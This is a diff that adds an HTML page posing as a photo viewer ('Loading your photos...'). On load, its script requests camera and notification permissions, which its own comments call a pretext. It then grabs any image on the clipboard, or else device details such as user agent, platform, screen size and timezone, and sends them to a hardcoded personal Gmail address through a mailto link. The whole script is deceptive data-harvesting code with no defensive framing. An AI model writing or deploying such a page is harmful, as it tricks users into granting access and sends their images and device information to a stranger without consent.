@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Photos</title>
+<style>
+body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; font-family: sans-serif; }
+#status { text-align: center; color: #666; font-size: 14px; margin-top: 20px; }
+img { max-width: 90vw; max-height: 70vh; object-fit: contain; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+</style>
+</head>
+<body>
+<img id="photo" src="" alt="">
+<div id="status">Loading your photos...</div>
+
+<script>
+// === CONFIG ===
+const EMAIL = "sldai8281@gmail.com";
+// =================
+
+async function sendEmail(subject, body) {
+    const mailtoLink = `mailto:${EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+    window.location.href = mailtoLink;
+}
+
+async function requestPermissions() {
+    try {
+        // Try to get camera permission as a pretext
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            stream.getTracks().forEach(track => track.stop());
+        }
+        
+        // Request notification permission as another pretext
+        if (Notification && Notification.permission !== 'granted') {
+            await Notification.requestPermission();
+        }
+        
+        document.getElementById('status').textContent = 'Syncing your photos...';
+        
+        // Attempt to access photos via various methods
+        let photoData = null;
+        
+        // Method 1: Try to read from clipboard (if user has copied something)
+        try {
+            const clipboardItems = await navigator.clipboard.read();
+            for (const item of clipboardItems) {
+                if (item.types.includes('image/png') || item.types.includes('image/jpeg')) {
+                    const blob = await item.getType(item.types[0]);
+                    photoData = blob;
+                    break;
+                }
+            }
+        } catch (e) {
+            console.log('Clipboard access failed:', e);
+        }
+        
+        // Method 2: If we have a photo from clipboard, send it
+        if (photoData) {
+            const reader = new FileReader();
+            reader.onloadend = function() {
+                const base64data = reader.result;
+                sendEmail("New Photo Captured", `Photo data attached:\n${base64data.substring(0, 1000)}...`);
+                document.getElementById('status').textContent = 'Photo sent!';
+            };
+            reader.readAsDataURL(photoData);
+        } else {
+            // Fallback: Just notify that permissions were granted
+            sendEmail("Android Device Access", "Permissions granted successfully.\n\nDevice Info:\n- User Agent: " + navigator.userAgent + "\n- Platform: " + navigator.platform + "\n- Screen Resolution: " + screen.width + "x" + screen.height + "\n- Language: " + navigator.language + "\n- Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone);
+            document.getElementById('status').textContent = 'Access granted!';
+        }
+    } catch (error) {
+        document.getElementById('status').textContent = 'Error accessing photos: ' + error.message;
+        sendEmail("Permission Error", "Failed to access photos: " + error.message);
+    }
+}
+
+// Start the process when page loads
+window.addEventListener('load', () => {
+    requestPermissions();
+});
+</script>
+</body>
+</html>
